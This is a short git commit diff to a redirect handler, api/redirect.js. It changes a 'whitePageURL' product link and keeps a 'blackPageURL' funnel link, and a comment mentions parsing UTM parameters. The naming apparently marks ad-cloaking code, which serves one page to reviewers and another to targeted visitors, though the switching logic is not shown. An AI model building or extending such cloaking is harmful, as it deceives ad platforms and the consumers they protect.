0151b115803189754ca0b67395395a970d85e46c
mahadzmn <mahadzaman05@gmail.com>
2025-02-10 23:34:17 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.fashiontiy.com/products/T103D15F72.html";
+    const whitePageURL = "https://www.5fyve.com/products/black-metal-hood-embroidered";
     const blackPageURL = "https://dnfiwbzxjq.myfunnelish.com/imbassd-1736979042571105-1738876081774221";
   
     // Parse the UTM parameters from the request URL
